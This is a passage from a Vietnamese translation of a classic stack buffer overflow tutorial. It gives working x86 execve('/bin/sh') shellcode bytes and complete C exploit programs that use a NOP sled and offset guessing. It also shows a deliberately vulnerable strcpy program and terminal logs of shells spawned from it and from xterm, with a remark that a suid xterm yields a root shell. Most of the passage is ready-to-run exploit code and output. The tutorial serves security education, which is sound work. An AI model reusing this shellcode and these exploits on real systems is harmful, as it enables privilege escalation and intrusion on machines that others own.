		   molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
                                                movl   %eax,0xc(%esi)
           --------------------------------------------------------
           movl   $0xb,%eax                     movb   $0xb,%al
           --------------------------------------------------------
           movl   $0x1, %eax                    xorl   %ebx,%ebx
           movl   $0x0, %ebx                    movl   %ebx,%eax
                                                inc    %eax
           --------------------------------------------------------

   Code sau khi được cải tiến

shellcodeasm2.c
------------------------------------------------------------------------------
void main() {
__asm__("
        jmp    0x1f                     # 2 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        xorl   %eax,%eax                # 2 bytes
	movb   %eax,0x7(%esi)		# 3 bytes
        movl   %eax,0xc(%esi)           # 3 bytes
        movb   $0xb,%al                 # 2 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        xorl   %ebx,%ebx                # 2 bytes
        movl   %ebx,%eax                # 2 bytes
        inc    %eax                     # 1 bytes
        int    $0x80                    # 2 bytes
        call   -0x24                    # 5 bytes
        .string \"/bin/sh\"             # 8 bytes
					# 46 bytes total
");
}
------------------------------------------------------------------------------
	
Và chương trình thử mới dưới đây :

testsc2.c
------------------------------------------------------------------------------
char shellcode[] =
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";

void main() {
   int *ret;

   ret = (int *)&ret + 2;
   (*ret) = (int)shellcode;

}
------------------------------------------------------------------------------
------------------------------------------------------------------------------
[aleph1]$ gcc -o testsc2 testsc2.c
[aleph1]$ ./testsc2
$ exit
[aleph1]$
------------------------------------------------------------------------------

						Viết một Exploit
						~~~~~~~~~~~~~~~~

Cho phép thử và ghép các phần của chúng tôi và có một shellcode, chúng tôi biết nó phải là một phần của chuỗi, chúng tôi sẽ sử dụng lỗi tràn bộ đệm. Chúng tôi biết chúng tôi phải chỉ ra địa chỉ trả về trở lại bộ đệm. Ví dụ dưới đây sẽ chứng minh những điều trên 


overflow1.c
------------------------------------------------------------------------------
char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

void main() {
  char buffer[96];
  int i;
  long *long_ptr = (long *) large_string;

  for (i = 0; i < 32; i++)
    *(long_ptr + i) = (int) buffer;

  for (i = 0; i < strlen(shellcode); i++)
    large_string[i] = shellcode[i];

  strcpy(buffer,large_string);
}
------------------------------------------------------------------------------

------------------------------------------------------------------------------
[aleph1]$ gcc -o exploit1 exploit1.c
[aleph1]$ ./exploit1
$ exit
exit
[aleph1]$
------------------------------------------------------------------------------

Những gì chúng ta đã làm ở trên là đầy mảng large_string[] với địa chỉ của buffer[], đó là nơi mà mã sẽ được thực hiện. Sau đó chúng tôi sao chép shellcode của chúng tôi vào chuỗi large_string. strcpy() sau đó sẽ sao chép large_string vào bộ đệm mà không kiểm tra điểm giới hạn để sao để sao chép và sẽ tràn địa chỉ trả về, ghi đè nó với địa chỉ mã của chúng tôi ngay ở đây. Một khi chúng ta đạt được kết thúc của main và cố gắng trả lại nhảy đến mã của chúng tôi và thực thi shell. 

Vấn đề của chúng ta gặp phải khi cố gắng tràn bộ đệm là đang cố gắng tìm ra địa chỉ của bộ đệm (và do code của chúng tôi) là được. Câu trả lời cho mỗi chương trình stack sẽ bắt đầu tại cùng một địa chỉ. Hầu hết các chương trình không PUSH hơn một vài trăm hoặc vài ngàn byte vào stack cùng một lúc. Vì vậy bằng cách biết nơi bắt đầu của stack, chúng ta có thể cố gắng đoán được nơi bộ đệm có thể bị tràn. Dưới đây là một chương trình nhỏ mà sẽ in ra con trỏ stack.

sp.c
------------------------------------------------------------------------------
unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}
void main() {
  printf("0x%x\n", get_sp());
}
------------------------------------------------------------------------------

------------------------------------------------------------------------------
[aleph1]$ ./sp
0x8000470
[aleph1]$
------------------------------------------------------------------------------

Giả sử chương trình này chúng tôi đang cố gắng để tràn bộ đệm. 

vulnerable.c
------------------------------------------------------------------------------
void main(int argc, char *argv[]) {
  char buffer[512];

  if (argc > 1)
    strcpy(buffer,argv[1]);
}
------------------------------------------------------------------------------

Chúng ta có thể tạo ra một chương trình với tham số là kích thước của buffer và một địa chỉ offset từ con trỏ stack (nơi chúng tôi nghĩ các bộ đệm muốn tràn). Chúng tôi sẽ đưa các chuỗi tràn trong một biến môi trường, vì vậy nó rất dễ dàng để thao tác.

exploit2.c
------------------------------------------------------------------------------
#include <stdlib.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr += 4;
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  memcpy(buff,"EGG=",4);
  putenv(buff);
  system("/bin/bash");
}
------------------------------------------------------------------------------

Bây giờ chúng ta có thể cố gắng đoán những gì bộ đệm:

------------------------------------------------------------------------------
[aleph1]$ ./exploit2 500
Using address: 0xbffffdb4
[aleph1]$ ./vulnerable $EGG
[aleph1]$ exit
[aleph1]$ ./exploit2 600
Using address: 0xbffffdb4
[aleph1]$ ./vulnerable $EGG
Illegal instruction
[aleph1]$ exit
[aleph1]$ ./exploit2 600 100
Using address: 0xbffffd4c
[aleph1]$ ./vulnerable $EGG
Segmentation fault
[aleph1]$ exit
[aleph1]$ ./exploit2 600 200
Using address: 0xbffffce8
[aleph1]$ ./vulnerable $EGG
Segmentation fault
[aleph1]$ exit
.
.
.
[aleph1]$ ./exploit2 600 1564
Using address: 0xbffff794
[aleph1]$ ./vulnerable $EGG
$
------------------------------------------------------------------------------

Như chúng ta có thể thấy điều này không phải là một quá trình hiệu quả. Đang cố gắng để offset bằng trong khi biết nơi bắt đầu của stack. Chúng tôi sẽ cần ít nhất cố gắng một trăm và ít nhất là một vài ngàn. Vấn đề của chúng ta cần phải đoán chính xác nơi địa chỉ mã của chúng tôi sẽ bắt đầu. Nếu chúng ta tắt hơn một byte hoặc ít hơn chúng tôi sẽ chỉ nhận được một segmentation violation hoặc một invalid instruction. Một cách để tăng hiệu quả là pad trước tràn bộ đệm với NOP. Hầu như tất cả các bộ vi xử lý có một lệnh NOP là không thực hiện một hoạt động nào cả. Nó thường được dùng để trì hoãn việc thực hiện cho các mục đích của thời gian. Chúng tôi sẽ lấy lợi thế của nó và điền vào một nửa của tràn bộ đệm. Chúng tôi sẽ đặt shellcode của chúng tôi ngay trung tâm và sau nó là với các địa chỉ trả về. Nếu chúng ta may mắn và bất cứ nơi nào của các địa chỉ trả về trong chuỗi các NOP, họ sẽ chỉ có thực hiện cho đến khi chạm tới mã của chúng tôi. NOP dài 1 byte và dịch nó ra là 0x90 trong mã máy. Giả sử stack bắt đầu tại địa chỉ 0xFF, S là viết tắt của shellcode và N là viết tắt của một lệnh NOP, stack mới sẽ như dưới đây. 


bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
           buffer                sfp   ret   a     b     c

<------   [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]
                 ^                     |
                 |_____________________|
top of                                                            bottom of
stack                                                                 stack

Code exploit mới sẽ như thế này:

exploit3.c
------------------------------------------------------------------------------
#include <stdlib.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define NOP                            0x90

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < bsize/2; i++)
    buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  memcpy(buff,"EGG=",4);
  putenv(buff);
  system("/bin/bash");
}
------------------------------------------------------------------------------

Một lựa chọn tốt cho kích thước của buffer là khoảng hơn 100 byte của bộ đệm và cố gắng để tràn nó. Điều này sẽ đặt mã của chúng tôi ở cuối của bộ đệm, rất nhiều không gian cho các NOP, nhưng vẫn ghi đè lên địa chỉ trả về với địa chỉ của chúng tôi đoán. Bộ đệm chúng tôi đang cố gắng để tràn nó với 512 byte, vì vậy chúng tôi sẽ sử dụng 612 byte. 

------------------------------------------------------------------------------
[aleph1]$ ./exploit3 612
Using address: 0xbffffdb4
[aleph1]$ ./vulnerable $EGG
$
------------------------------------------------------------------------------

Whoa ! Lần thử đầu tiên ! Sự thay đổi đã cải thiện cơ hội của chúng tôi. Bây giờ hãy thử nó trên một trường hợp thực tế của một lỗi tràn bộ đệm. Chúng tôi sẽ sử dụng các lỗi tràn bộ đệm trên thư viện Xt. Ví dụ của chúng tôi, chúng tôi sẽ sử dụng xterm (tất cả các chương trình liên kết với xterm đều dễ có các lỗ hổng). Bạn phải chạy được một máy chủ ảo X và cho phép kết nối nó từ localhost. Thiết lập biến DISPLAY cho phù hợp. 

------------------------------------------------------------------------------
[aleph1]$ export DISPLAY=:0.0
[aleph1]$ ./exploit3 1124
Using address: 0xbffffdb4
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
Warning: Color name "^1FF
                           
                            V

1@/bin/sh


















^C
[aleph1]$ exit
[aleph1]$ ./exploit3 2148 100
Using address: 0xbffffd48
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
Warning: Color name "^1FF
                           
                            V

1@/bin/shHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH








HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH








HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH








HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH








HHHHHHHHHHHH
Warning: some arguments in previous message were lost
Illegal instruction
[aleph1]$ exit
.
.
.
[aleph1]$ ./exploit4 2148 600
Using address: 0xbffffb54
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
Warning: Color name "^1FF
                           
                            V

1@/bin/shTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT








TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT








TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT








TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT








TTTTTTTTTTTT
Warning: some arguments in previous message were lost
bash$
------------------------------------------------------------------------------

Ra rồi ! Cố gắng ít hơn 12 và chúng tôi tìm thấy những con số kì diệu. Nếu xterm cài đặt ở suid root, nó sẽ là một root shell.
